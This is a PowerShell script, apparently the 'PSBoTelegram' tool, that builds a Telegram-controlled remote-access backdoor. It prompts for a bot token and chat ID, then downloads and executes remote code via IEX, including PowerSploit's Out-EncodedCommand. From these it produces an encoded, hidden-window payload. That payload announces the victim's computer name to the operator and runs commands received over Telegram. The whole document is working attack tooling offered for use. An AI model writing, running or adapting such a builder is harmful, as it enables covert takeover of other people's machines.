clear
$ErrorActionPreference = "SilentlyContinue"
$version = "0.3"

$banner = "    ____  _____ ____      ______     __                              
   / __ \/ ___// __ )____/_  __/__  / /__   ____ __________ _____ __
  / /_/ /\__ \/ __  / __ \/ / / _ \/ / _ \/ __  / ___/ __  / __  __ \
 / ____/___/ / /_/ / /_/ / / /  __/ /  __/ /_/ / /  / /_/ / / / / / /
/_/    /____/_____/\____/_/  \___/_/\___/\__, /_/   \__,_/_/ /_/ /_/ 
                                        /____/                       "





Write-Host $banner -ForegroundColor Green ; Write-Host "`n                                                     v$version by CyberVaca @ Luis Vacas" -ForegroundColor red

Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Introduzca el Token del Bot de Telegram: " -ForegroundColor Green -NoNewline ; [string]$your_token = Read-Host
Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Introduzca su Chat ID: " -ForegroundColor Green -NoNewline ; [int]$your_chat_id = Read-Host
Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Introduzca el delay para la conexión: " -ForegroundColor Green -NoNewline ; [int]$your_delay = Read-Host

Function check-command
{
 Param ($command)
 $antigua_config = $ErrorActionPreference
 $ErrorActionPreference = ‘stop’
 try {if(Get-Command $command){RETURN $true}}
 Catch { RETURN $false}
 Finally {$ErrorActionPreference=$antigua_config}
 }
if ((check-command Invoke-WebRequest) -eq $false) {$objeto = "system.net.webclient" ; $webclient = New-Object $objeto ; $webrequest = $webclient.DownloadString("https://raw.githubusercontent.com/mwjcomputing/MWJ-Blog-Respository/master/PowerShell/Invoke-WebRequest.ps1");Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la función Invoke-Webrequest`n" -ForegroundColor Green -NoNewline ; IEX $webrequest}
Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la función Out-EncodedCommand de PowerSploit `n" -ForegroundColor Green -NoNewline 
IEX (Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/ScriptModification/Out-EncodedCommand.ps1").content
Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Tu código es: `n`n" -ForegroundColor Green -NoNewline  ; sleep -Seconds 1
$scriptblock = {
param (
[string]$botkey = "your_token",
[string]$bot_Master_ID = "your_chat_id",
[int]$delay = "your_delay"
)
IEX (Invoke-WebRequest "https://raw.githubusercontent.com/hackplayers/psbotelegram/master/Functions.ps1").content 
$chat_id = $bot_Master_ID ; $getMeLink = "https://api.telegram.org/bot$botkey/getMe" ; $bot = $getMeLink -split "/" ; $bot = [string]$bot[3] ; $getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates" 
[int]$first_connect = "1"
while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json
    $l = $json.result.length
	$i = 0
if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1}
	while ($i -lt $l) {
	$offset = $json.result[$i].update_id + 1
        $comando = $json.result[$i].message.text
        test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect
   	$i++
	}
	Start-Sleep -s $delay ;$first_connect++ 
}
}
$scriptblock | Out-File bot.ps1
$scriptblock -replace "your_token", "$your_token" -replace "your_chat_id", "$your_chat_id" -replace "your_delay", "$your_delay" | Out-File bot.ps1
Out-EncodedCommand -Path bot.ps1 -NoProfile -NonInteractive -WindowStyle Hidden -EncodedOutput ; Remove-Item bot.ps1
pause
